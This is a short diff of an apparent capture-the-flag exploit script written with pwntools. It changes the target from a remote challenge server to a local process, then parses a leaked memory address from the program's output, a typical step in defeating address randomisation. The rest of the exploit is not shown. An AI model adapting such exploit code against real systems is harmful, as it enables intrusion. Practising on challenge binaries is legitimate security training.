@@ -3,8 +3,8 @@ from pwn import *
 context.log_level = 'info'
 
 def exploit():
-    # p = process('./precision_measurements')
-    p = remote('challenges.mcsc.space', 2222)
+    p = process('./precision_measurements')
+    # p = remote('localhost', 2222)
     
     p.recvuntil(b'Discovered Harappan weight marker: ')
     leaked_addr = int(p.recvline().strip(), 16)
